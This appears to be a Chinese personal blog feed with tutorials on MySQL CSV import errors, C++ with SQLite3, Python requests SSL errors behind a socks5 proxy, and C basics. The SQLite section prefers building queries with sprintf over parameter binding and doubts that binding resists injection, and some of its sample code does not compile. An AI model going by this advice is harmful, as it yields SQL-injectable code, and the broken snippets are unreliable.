&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;quot;file_name&amp;quot; INTO TABLE tbl_name
&lt;/code>&lt;/pre>&lt;p>是无法完成插入操作的，大概率会出现如下报错&lt;/p>
&lt;pre tabindex="0">&lt;code>Data truncated for column xxx at row 1
&lt;/code>&lt;/pre>&lt;p>因为我们需要指定你准备导入的csv文件格式&lt;/p>
&lt;ul>
&lt;li>完整命令&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;quot;D:/CoderLife/testMySQL/test.csv&amp;quot; -- 指定csv文件路径，路径必须是我们一开始设置的
INTO TABLE nation -- 指定你要插入的表格
FIELDS TERMINATED BY ',' -- 指定csv文件是以逗号为分隔符
ENCLOSED BY '&amp;quot;' -- 指定文本以双引号闭合
LINES TERMINATED BY &amp;quot;\r\n&amp;quot;; -- 指定行按照如上格式换行
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;h3 id="拓展补充">拓展补充&lt;/h3>
&lt;ul>
&lt;li>\r 回车符&lt;/li>
&lt;li>\n 换行符&lt;/li>
&lt;li>window环境下文本文件换行多数以“\r\n”为换行符&lt;/li>
&lt;li>Linux环境下的文本文件换行就是以“\n”&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>有关这个导入命令的详解，可以移步&lt;a class="link" href="https://blog.csdn.net/haijiege/article/details/78365063" target="_blank" rel="noopener"
>这篇文章&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;h3 id="报错-duplicate-entry-for-key-">报错“ Duplicate entry for key &amp;hellip;”&lt;/h3>
&lt;p>这个报错是因为你之前的表内有数据导致了主键冲突，方法删除旧的表内的内容。&lt;/p>
&lt;pre tabindex="0">&lt;code>delete from table_name
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;h3 id="报错row-does-not-contain-data-for-all-columns">报错“Row does not contain data for all columns”&lt;/h3>
&lt;p>这个报错是因为csv内的数据并没有包含表的所有键值，那么这就需要在我们导入数据的时候指定导入数据数据那几列
就是在之前上面的导入代码最后加上一个括号，里面按照csv数据列的顺序依次标注其键名&lt;/p>
&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;quot;D:/CoderLife/testMySQL/test.csv&amp;quot; -- 指定csv文件路径，路径必须是我们一开始设置的
INTO TABLE nation -- 指定你要插入的表格
FIELDS TERMINATED BY ',' -- 指定csv文件是以逗号为分隔符
ENCLOSED BY '&amp;quot;' -- 指定文本以双引号闭合
LINES TERMINATED BY &amp;quot;\r\n&amp;quot; -- 指定行按照如上格式换行
(key1,key2,key3); -- 指定你需要导入的键
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;h3 id="报错-incorrect-integer-value-xxx">报错“ Incorrect integer value: xxx”&lt;/h3>
&lt;p>这个报错是因为csv文件第一行存在着表头数据，我们可以数用如下命令忽略第一行&lt;/p>
&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;quot;D:/CoderLife/testMySQL/test.csv&amp;quot; -- 指定csv文件路径，路径必须是我们一开始设置的
INTO TABLE nation -- 指定你要插入的表格
FIELDS TERMINATED BY ',' -- 指定csv文件是以逗号为分隔符
ENCLOSED BY '&amp;quot;' -- 指定文本以双引号闭合
LINES TERMINATED BY &amp;quot;\r\n&amp;quot; -- 指定行按照如上格式换行
IGNORE 1 LINES -- 指定忽略第一行
(key1,key2,key3); -- 指定你需要导入的键
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;h3 id="关于字符编码问题的补充">关于字符编码问题的补充&lt;/h3>
&lt;p>其实可以通过指定导入的csv文件编码来保证字符编码问题，使用如下命令&lt;/p>
&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;quot;D:/CoderLife/testMySQL/test.csv&amp;quot; -- 指定csv文件路径，路径必须是我们一开始设置的
INTO TABLE nation CHARACTER SET utf8-- 指定你要插入的表格
FIELDS TERMINATED BY ',' -- 指定csv文件是以逗号为分隔符
ENCLOSED BY '&amp;quot;' -- 指定文本以双引号闭合
LINES TERMINATED BY &amp;quot;\r\n&amp;quot; -- 指定行按照如上格式换行
IGNORE 1 LINES -- 指定忽略第一行
(key1,key2,key3); -- 指定你需要导入的键
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;h2 id="以上所有问题几乎都可以因为使用图形化界面而避免ㄟ---ㄏ">以上所有问题几乎都可以因为使用图形化界面而避免ㄟ( ▔, ▔ )ㄏ&lt;/h2>
&lt;p>意不意外，刺不刺激？？？&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>C++与SQLite</title><link>https://blog.yuukisama.cc/p/c-%E4%B8%8Esqlite/</link><pubDate>Tue, 14 May 2019 08:47:25 +0000</pubDate><guid>https://blog.yuukisama.cc/p/c-%E4%B8%8Esqlite/</guid><description>&lt;h2 id="摘要">摘要&lt;/h2>
&lt;ul>
&lt;li>本文主要讲解了C++对接sqlite3数据库的配置以及相关操作&lt;/li>
&lt;li>IDE：Visual Studio 2017&lt;/li>
&lt;li>SQLite3&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/sqlite.jpg" >
&lt;img src="https://blog.yuukisama.cc/sqlite.jpg"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h2 id="碎碎念">碎碎念&lt;/h2>
&lt;p>敲代码不接触数据库几乎是不可能的。但是很多学校开设的课程都是从Mysql开始的，导致很多学生一些项目就是Mysql。毫无疑问Mysql是很强大的，但是有的时候我们真的很需要因地制宜选择更加合适的数据库。&lt;del>其实还是因为C++&amp;amp;Mysql的模式本垃圾配置不来&lt;/del>&lt;/p>
&lt;h2 id="sqlite3-简介">SQLite3 简介&lt;/h2>
&lt;ul>
&lt;li>SQLite是一个进程内的库，实现了完全的自给自足的，无服务器的，零配置的，事务性的SQL数据库引擎。&lt;/li>
&lt;li>零配置意味着你不需要在任何一台机器上像mysql一样进行复杂的配置&lt;/li>
&lt;li>SQLite正如其名，轻量级，操作方便。毫无疑问相对于功能强大的mysql它缺少了很多相应的其他功能，但是如果你不准备采取分布式结构分离数据应用，复杂的数据库功能，只是需要一个轻量化便捷的数据库基础功能，SQLite是你最好的选择&lt;/li>
&lt;li>&lt;del>嗯，sqlite的c++API也不像mysql的那么变态&lt;/del>&lt;/li>
&lt;/ul>
&lt;h2 id="下载sqlite3">下载SQLite3&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>依据你的需要的系统版本在SQLite官方下载源代码版本 &lt;a class="link" href="https://www.sqlite.org/download.html" target="_blank" rel="noopener"
>官方下载界面&lt;/a>&lt;/p>
&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/1.png" >
&lt;img src="https://blog.yuukisama.cc/1.png"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>SQLite官方给出了编译好的动态链接库方便开发，不过本教程以源代码入手（因为只要配置正确相较于动态链接库文件，本方法调用更为简单，并且效率更高）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如图我们选择第一个下载。下载完成之后我们解压到当前文件夹，并修改文件夹为sqlite。把文件夹移动到我们自己的项目里，并在IDE中引入该文件夹。（具体怎么引入瞎几把发挥啦，随你是添加额外项目还是添加额外包含目录，搞通就行hhh）&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="sqlite3的基础操作">SQLite3的基础操作&lt;/h2>
&lt;ul>
&lt;li>sqlite遵循最基本的通用sql语句。所以大部分操作与mysql等一系列其他数据库无差异&lt;/li>
&lt;li>你可以从sqlite3官网下载exe可执行文件用以访问sqlite生成的数据库文件，在可执行文件内，基础的支持命令如下：
&lt;pre tabindex="0">&lt;code>sqlite3.exe ./test.db //在命令行内使用该命令连接指定数据库文件，不存在则创建
&lt;/code>&lt;/pre>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>命令&lt;/th>
&lt;th>作用&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>.backup ?DB? FILE&lt;/td>
&lt;td>备份 DB 数据库（默认是 &amp;ldquo;main&amp;rdquo;）到 FILE 文件。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.bail ON&lt;/td>
&lt;td>OFF&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.databases&lt;/td>
&lt;td>列出数据库的名称及其所依附的文件。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.dump ?TABLE?&lt;/td>
&lt;td>以 SQL 文本格式转储数据库。如果指定了 TABLE 表，则只转储匹配 LIKE 模式的 TABLE 表。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.echo ON&lt;/td>
&lt;td>OFF&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.exit&lt;/td>
&lt;td>退出 SQLite 提示符。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.explain ON&lt;/td>
&lt;td>OFF&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.header(s) ON&lt;/td>
&lt;td>OFF&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.help&lt;/td>
&lt;td>显示帮助消息。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.import FILE TABLE&lt;/td>
&lt;td>导入来自 FILE 文件的数据到 TABLE 表中。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.indices ?TABLE?&lt;/td>
&lt;td>显示所有索引的名称。如果指定了 TABLE 表，则只显示匹配 LIKE 模式的 TABLE 表的索引。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.load FILE ?ENTRY?&lt;/td>
&lt;td>加载一个扩展库。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.log FILE&lt;/td>
&lt;td>off&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.mode MODE&lt;/td>
&lt;td>设置输出模式，MODE 可以是下列之一：&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>csv 逗号分隔的值&lt;/li>
&lt;li>column 左对齐的列&lt;/li>
&lt;li>html HTML 的 &amp;lt;table&amp;gt; 代码&lt;/li>
&lt;li>insert TABLE 表的 SQL 插入（insert）语句&lt;/li>
&lt;li>line 每行一个值&lt;/li>
&lt;li>list 由 .separator 字符串分隔的值&lt;/li>
&lt;li>tabs 由 Tab 分隔的值&lt;/li>
&lt;li>tcl TCL 列表元素&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>-&lt;/th>
&lt;th>-&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>.nullvalue STRING&lt;/td>
&lt;td>在 NULL 值的地方输出 STRING 字符串。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.output FILENAME&lt;/td>
&lt;td>发送输出到 FILENAME 文件。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.output stdout&lt;/td>
&lt;td>发送输出到屏幕。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.print STRING&amp;hellip;&lt;/td>
&lt;td>逐字地输出 STRING 字符串。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.prompt MAIN CONTINUE&lt;/td>
&lt;td>替换标准提示符。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.quit&lt;/td>
&lt;td>退出 SQLite 提示符。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.read FILENAME&lt;/td>
&lt;td>执行 FILENAME 文件中的 SQL。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.schema ?TABLE?&lt;/td>
&lt;td>显示 CREATE 语句。如果指定了 TABLE 表，则只显示匹配 LIKE 模式的 TABLE 表。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.separator STRING&lt;/td>
&lt;td>改变输出模式和 .import 所使用的分隔符。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.show&lt;/td>
&lt;td>显示各种设置的当前值。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.stats ON&lt;/td>
&lt;td>OFF&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.tables ?PATTERN?&lt;/td>
&lt;td>列出匹配 LIKE 模式的表的名称。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.timeout MS&lt;/td>
&lt;td>尝试打开锁定的表 MS 毫秒。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.width NUM NUM&lt;/td>
&lt;td>为 &amp;ldquo;column&amp;rdquo; 模式设置列宽度。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.timer ON&lt;/td>
&lt;td>OFF&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ul>
&lt;h2 id="使用c连接sqlite并执行一条sql语句">使用C++连接SQLite并执行一条sql语句&lt;/h2>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;iostream&amp;gt;
#include&amp;lt;sqlite3.h&amp;gt;
using namespace std;
//需要执行的sql语句
const char sql[] = {
&amp;quot;CREATE TABLE IF NOT EXISTS Users(&amp;quot;
&amp;quot;ID INTEGER PRIMARY KEY NOT NULL,&amp;quot;
&amp;quot;Stu_ID INTEGER,&amp;quot;
&amp;quot;Password TEXT&amp;quot;
&amp;quot;);&amp;quot;
};
int main(){
sqlite3 *db=NULL; //数据库句柄
char *ErrMsg=NULL; //错误信息指针
int rc=0; //函数执行返回值
DATABASE=&amp;quot;./test.db&amp;quot;//需要连接的数据库路径
//连接数据库，并将返回的数据库句柄交给db
rc=sqlite3_open(DATABASE,&amp;amp;db);
if (rc){
//如果链接失败关闭句柄退出程序
sqlite3_close(db);
cout&amp;lt;&amp;lt;&amp;quot;Cannot connect to &amp;quot;&amp;lt;&amp;lt;DATABASE&amp;lt;&amp;lt;endl;
return 0;
}
//执行sql语句
rc=sqlite3_exec(db,sql,NULL,NULL,&amp;amp;ErrMsg);
if (rc){
如果执行失败关闭句柄，打印出错误信息，退出程序
sqlite3_close(db);
cout&amp;lt;&amp;lt;&amp;quot;sql execute failed...&amp;quot;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;ErrMsg&amp;lt;&amp;lt;endl;
return 0;
}
cout&amp;lt;&amp;lt;&amp;quot;table create&amp;quot;&amp;lt;&amp;lt;endl;
//关闭数据库句柄释放内存
sqlite3_close(db);
return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>sqlite3_open(const char *filename,sqlite3 **ppDb)&lt;/p>
&lt;p>该函数用以打开指定数据库（不存在则创建），并返回一个数据库连接对象。函数返回值表示执行成功与否。
&lt;strong>如果filename为:memory:，sqlite将会在内存里创建一个数据库&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>sqlite3_exec(sqlite3* db,const char *sql,sqlite_callback,void *data,char **ErrMsg)&lt;/p>
&lt;p>该函数用以执行sql语句，sql语句可以是一条也可以是多条。&lt;/p>
&lt;ul>
&lt;li>sqlite3* db 数据库连接句柄&lt;/li>
&lt;li>const char *sql 需要执行的sql语句&lt;/li>
&lt;li>sqlite_callback 执行成功后的回调函数&lt;/li>
&lt;li>void *data 回调函数参数&lt;/li>
&lt;li>char **ErrMsg 错误信息&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>sqlite3_close(sqlite3* db)&lt;/p>
&lt;p>该函数用以关闭数据库连接，释放内存。所有相关sql语句都应该在连接关闭之前完成，如果仍有sql语句在执行，该函数将返回SQLITE_BUSY错误&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="sqlite3回调函数">sqlite3回调函数&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="https://blog.csdn.net/qq_29924041/article/details/74857469" target="_blank" rel="noopener"
>什么是回调函数&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>SQLite中的回调函数可以让我们自定义sql语句执行完成之后的操作。sqlite3_exec中执行的sql语句的执行结果会被默认传递给回调函数（如果你定义了的话）&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>sqlite3_exec(db,&amp;quot;select * from users;&amp;quot;,callback,&amp;quot;helloworld&amp;quot;,&amp;amp;ErrMsg)
//该回调函数将会在sql语句执行时每一行数据返回时被执行
static int callback(void *data,int argc,char **argv,char **azColName){
//同时会打印由sqlite3_exec传入的参数&amp;quot;helloworld&amp;quot;
printf(&amp;quot;%s&amp;quot;,(char*)data);
for(int i=0;i&amp;lt;argc;i++){
printf(&amp;quot;%s : %s\n&amp;quot;,azColName[i],argv[i]?argv[i]:&amp;quot;NULL&amp;quot;);
}
return 0;
}
&lt;/code>&lt;/pre>&lt;h2 id="不用回调函数获取sql结果">不用回调函数获取sql结果&lt;/h2>
&lt;ul>
&lt;li>sqlite的回调函数尽管已经很方便，但是对于某些情景的应用时却力不从心，有什么办法可以不适用回调函数也获取sql的执行结果么？答案是有的&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>void func(){
sqlite3 *db=NULL; //定义数据库句柄
sqlite3_stmt* stmt=NULL;//Statement handle 能令sqlite3_step()执行的编译好的准备语句的指针。调用sqlite3_finalize()删除它。
const char *zTail=NULL; //Pointer to unusedportion of zSql 当zSql在遇见终止符或者达到设定的nByte结束后，如果还有剩余的内容，那么这些剩余的内容将被存放到pzTail中，不包含终止符
const char sql[]=&amp;quot;select ID from users;&amp;quot;
int rc;
rc=sqlite3_open(&amp;quot;./test.db&amp;quot;,&amp;amp;db);
if (rc) return;
//准备sql语句
if (sqlite3_prepare_v2(db,sql,strlen(sql),&amp;amp;stmt,&amp;amp;zTail)==SQLITE_OK){
//步进执行，并获取执行结果
while (sqlite3_step(stmt)==SQLITE_ROW)
print(&amp;quot;%d\n&amp;quot;,sqlite3_column_int(stmt,0));
/*
sqlite3_column_int(stmt,0) 第二个参数表示sql语句返回的数据的列数，从0开始，本例子中的sql语句只选取了ID那一列，所以这里只用数字0
sqlite3_column_text()用以获取字符串类型返回值
sqlite3_column_int64()用以获取int64大小的返回值
*/
}
//释放资源
sqlite3_finalize(stmt);
sqlite3_close(db);
return;
}
&lt;/code>&lt;/pre>&lt;p>sqlite还有很多其他的函数用以获取sql语句执行结果，详情可以参见官方文档&lt;/p>
&lt;h2 id="构造sql语句并执行">构造sql语句并执行&lt;/h2>
&lt;ul>
&lt;li>尽管一旦程序中有接收用户参数动态构造sql语句的程序实现，就通常意味着sql注入漏洞的存在，但是数据库与用户输入数据的交互几乎是不可能不存在的。所以下面我们介绍有关构造sql语句的方法&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;p>使用字符串处理函数（个人安利）&lt;/p>
&lt;p>sql语句本质是一段字符串，所以我们可以直接使用c++自带的字符串处理函数用以绑定参数，动态构造sql语句&lt;/p>
&lt;pre tabindex="0">&lt;code>int id=1;
//首先定义一个字符数组用以存放动态生成的sql语句
char sql[1024]={0};
//使用相对安全的没有缓冲区溢出漏洞的sprintf_s构造sql语句
sprintf_s(sql,1024,&amp;quot;select * from users where ID=%d&amp;quot;,id);
//如果你的编译器不支持sprintf_s()函数，也可使用相对不安全的sprintf()函数
sprintf(sql,&amp;quot;select * from users where ID=%d&amp;quot;,id);
//执行sql语句，这里函数换成sqlite3_prepare_v2()也是一样
sqlite3_exec(db,sql,NULL,NULL,&amp;amp;Errmsg);
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>使用sqlite3自带的绑定参数函数&lt;/p>
&lt;pre tabindex="0">&lt;code>int id=1;
char sql[1024]=&amp;quot;select * from users where ID=?&amp;quot;;
sqlite3_stmt *stmt=NULL;
sqlite3_prepare_v2(db,sql,strlen(sql),&amp;amp;stmt,NULL);
//绑定整形参数到对应位置，参数位置从1开始
sqlite3_bind_int(stmt,1,id);
/*
sqlite3_bind_text(stmt,pos,&amp;quot;halloworld&amp;quot;,strlen(&amp;quot;halloworld&amp;quot;),SQLITE_STATIC)
*/
...
&lt;/code>&lt;/pre>&lt;p>&lt;del>据说&lt;/del>使用sqlite3_bind_*()函数相对使用字符串处理函数更为节省内存，有一定程度可以规避sql注入攻击的效果（这里我感觉不是很苟同，这段是网上说的）&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="中文字符编码问题">中文字符编码问题&lt;/h2>
&lt;p>Visual studio等一众Win下的IDE，编辑器默认编码不是utf-8，而sqlite3默认的字符编码是utf-8.于是又到了我们喜闻乐见的字符编码问题。这里给大家安利一波函数，方便的进行字符格式转换。&lt;/p>
&lt;p>&lt;strong>请将如下代码全部纳入你的项目中因为函数之间存在相互调用问题&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>//UTF-8转Unicode
std::wstring Utf82Unicode(const std::string&amp;amp; utf8string) {
int widesize = ::MultiByteToWideChar(CP_UTF8, 0, utf8string.c_str(), -1, NULL, 0);
if (widesize == ERROR_NO_UNICODE_TRANSLATION)
{
throw std::exception(&amp;quot;Invalid UTF-8 sequence.&amp;quot;);
}
if (widesize == 0)
{
throw std::exception(&amp;quot;Error in conversion.&amp;quot;);
}
std::vector&amp;lt;wchar_t&amp;gt; resultstring(widesize);
int convresult = ::MultiByteToWideChar(CP_UTF8, 0, utf8string.c_str(), -1, &amp;amp;resultstring[0], widesize);
if (convresult != widesize)
{
throw std::exception(&amp;quot;La falla!&amp;quot;);
}
return std::wstring(&amp;amp;resultstring[0]);
}
//unicode 转为 ascii
std::string WideByte2Acsi(std::wstring&amp;amp; wstrcode) {
int asciisize = ::WideCharToMultiByte(CP_OEMCP, 0, wstrcode.c_str(), -1, NULL, 0, NULL, NULL);
if (asciisize == ERROR_NO_UNICODE_TRANSLATION)
{
throw std::exception(&amp;quot;Invalid UTF-8 sequence.&amp;quot;);
}
if (asciisize == 0)
{
throw std::exception(&amp;quot;Error in conversion.&amp;quot;);
}
std::vector&amp;lt;char&amp;gt; resultstring(asciisize);
int convresult = ::WideCharToMultiByte(CP_OEMCP, 0, wstrcode.c_str(), -1, &amp;amp;resultstring[0], asciisize, NULL, NULL);
if (convresult != asciisize)
{
throw std::exception(&amp;quot;La falla!&amp;quot;);
}
return std::string(&amp;amp;resultstring[0]);
}
//utf-8 转 ascii
std::string UTF_82ASCII(std::string&amp;amp; strUtf8Code) {
using namespace std;
string strRet = &amp;quot;&amp;quot;;
//先把 utf8 转为 unicode
wstring wstr = Utf82Unicode(strUtf8Code);
//最后把 unicode 转为 ascii
strRet = WideByte2Acsi(wstr);
return strRet;
}
//ascii 转 Unicode
std::wstring Ascii2WideByte(std::string&amp;amp; strascii) {
using namespace std;
int widesize = MultiByteToWideChar(CP_ACP, 0, (char*)strascii.c_str(), -1, NULL, 0);
if (widesize == ERROR_NO_UNICODE_TRANSLATION)
{
throw std::exception(&amp;quot;Invalid UTF-8 sequence.&amp;quot;);
}
if (widesize == 0)
{
throw std::exception(&amp;quot;Error in conversion.&amp;quot;);
}
std::vector&amp;lt;wchar_t&amp;gt; resultstring(widesize);
int convresult = MultiByteToWideChar(CP_ACP, 0, (char*)strascii.c_str(), -1, &amp;amp;resultstring[0], widesize);
if (convresult != widesize)
{
throw std::exception(&amp;quot;La falla!&amp;quot;);
}
return std::wstring(&amp;amp;resultstring[0]);
}
//Unicode 转 Utf8
std::string Unicode2Utf8(const std::wstring&amp;amp; widestring) {
using namespace std;
int utf8size = ::WideCharToMultiByte(CP_UTF8, 0, widestring.c_str(), -1, NULL, 0, NULL, NULL);
if (utf8size == 0)
{
throw std::exception(&amp;quot;Error in conversion.&amp;quot;);
}
std::vector&amp;lt;char&amp;gt; resultstring(utf8size);
int convresult = ::WideCharToMultiByte(CP_UTF8, 0, widestring.c_str(), -1, &amp;amp;resultstring[0], utf8size, NULL, NULL);
if (convresult != utf8size)
{
throw std::exception(&amp;quot;La falla!&amp;quot;);
}
return std::string(&amp;amp;resultstring[0]);
}
//ascii 转 Utf8
std::string ASCII2UTF_8(std::string&amp;amp; strAsciiCode) {
using namespace std;
string strRet(&amp;quot;&amp;quot;);
//先把 ascii 转为 unicode
wstring wstr = Ascii2WideByte(strAsciiCode);
//最后把 unicode 转为 utf8
strRet = Unicode2Utf8(wstr);
return strRet;
}
&lt;/code>&lt;/pre></description></item><item><title>Python requests ssl报错</title><link>https://blog.yuukisama.cc/p/python-requests-ssl%E6%8A%A5%E9%94%99/</link><pubDate>Tue, 16 Apr 2019 23:23:02 +0000</pubDate><guid>https://blog.yuukisama.cc/p/python-requests-ssl%E6%8A%A5%E9%94%99/</guid><description>&lt;h2 id="问题背景">问题背景&lt;/h2>
&lt;ul>
&lt;li>这是遇到的一个天坑！ &lt;del>这么过分的坑一定要写下来！！！！&lt;/del>&lt;/li>
&lt;li>项目需求：
&lt;ul>
&lt;li>爬取一个位于国外的网站，所以需要使用proxy，这里使用socks5代理&lt;/li>
&lt;li>网站是https，所以需要ssl&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>就是在这的需求之下，代码持续爆出如下错误：
&lt;pre tabindex="0">&lt;code>requests.exceptions.SSLError: SOCKSHTTPSConnectionPool(host='www.xxx.org', port=443): Max retries exceeded with url: /file/ (Caused by SSLError(SSLError(&amp;quot;bad handshake: SysCallError(-1, 'Unexpected EOF')&amp;quot;)))
requests.exceptions.ConnectionError: SOCKSHTTPSConnectionPool(host='www.xxx.org', port=443): Max retries exceeded with url: /file/ (Caused by NewConnectionError('&amp;lt;urllib3.contrib.socks.SOCKSHTTPSConnection object at 0x0000021C585105C0&amp;gt;: Failed to establish a new connection: [Errno 11001] getaddrinfo failed'))
requests.exceptions.SSLError: HTTPSConnectionPool(host='msft.com', port=443): Max retries exceeded with url: / (Caused by SSLError(&amp;quot;Can't connect to HTTPS URL because the SSL module is not available.&amp;quot;))
......
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>本文就来好好踩踩这些坑&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="ssl-module-is-not-available">SSL module is not available&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>出现如上错误表明程序未能正确加载引用ssl&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果你是linux系统，linux系统使用源码编译出来的python在编译过程种没有设定编译ssl库，建议重新编译安装python。或者尝试通过pip安装openssl&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果你是一个win下的conda用户，首先也可以尝试使用conda安装缺失的openssl库。&lt;/p>
&lt;ul>
&lt;li>如果openssl本来就已经存在了，但是代码还是出现如上报错，并且你是使用某些编辑器（列如vscode）编写python脚本的，可能是因为安装好的openssl由于缺少环境变量的支持无法被程序正确的调用，你可以通过配置环境变量，或者在conda的命令行里运行你编写的脚本&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="bad-handshake-syscallerror-1-unexpected-eof">bad handshake: SysCallError(-1, &amp;lsquo;Unexpected EOF&amp;rsquo;)&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>这是最坑的一个错误&lt;/p>
&lt;/li>
&lt;li>
&lt;p>错误的握手包。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>新版本的openssl将有漏洞的cipher禁用了，使用TSL1.0一下的cipher都无法匹配。这在新版本的requests中也是如此。
解决方法有人说是降低requests版本，还有一个方法是在代理服务器地址写成如下格式&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code># socks5h://127.0.0.1:1080
r=requests.get(URL,proxies={&amp;quot;https&amp;quot;:&amp;quot;socks5h://127.0.0.1:1080&amp;quot;})
&lt;/code>&lt;/pre>&lt;p>&lt;del>对就是加了个h&lt;/del>&lt;/p>
&lt;ul>
&lt;li>加h的含义：
&lt;pre tabindex="0">&lt;code>socks5h:// socks4a://
&lt;/code>&lt;/pre>表示主机名由socks服务器解析;
&lt;pre tabindex="0">&lt;code>socks5:// socks4://
&lt;/code>&lt;/pre>表示主机名在本地解析&lt;/li>
&lt;/ul></description></item><item><title>C语言基础精炼</title><link>https://blog.yuukisama.cc/p/c%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E7%B2%BE%E7%82%BC/</link><pubDate>Sat, 30 Mar 2019 21:46:48 +0000</pubDate><guid>https://blog.yuukisama.cc/p/c%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E7%B2%BE%E7%82%BC/</guid><description>&lt;h2 id="前言">前言：&lt;/h2>
&lt;ul>
&lt;li>这是一篇有关C语言语法基础的精炼概述性质文章，不会涉及C语言一些有深度的内容&lt;/li>
&lt;li>本文面向的是以大学C考试过关为目标，以计算机二级认证为目标，期望获得一个C语言最基础认识的读者&lt;/li>
&lt;li>博主能力有限，可能某些知识点未能讲解清晰，某些知识点遗漏，甚至某些知识点错误，若发现以上问题欢迎邮件勘误。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="start">Start&lt;/h2>
&lt;h2 id="c语言基本结构">C语言基本结构&lt;/h2>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
/* 这是每个程序的开始 */
printf(&amp;quot;Hello World!\n&amp;quot;); //这是另一种注释方法
return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>所有C语言程序都包含一个main()函数，程序从main()函数开始执行，每个函数用花括号“{}”包括。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>C语言有两种添加注释方法&lt;/p>
&lt;ol>
&lt;li>以“//”开头的单行注释&lt;/li>
&lt;li>以“/**/”包裹的多行注释，或者叫块注释&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>stdio.h是一个头文件（标准输入输出头文件，这个头文件内包含printf函数的定义与实现，如果没有找到stdio.h，printf函数会出现编译错误）。&lt;/p>
&lt;/li>
&lt;li>
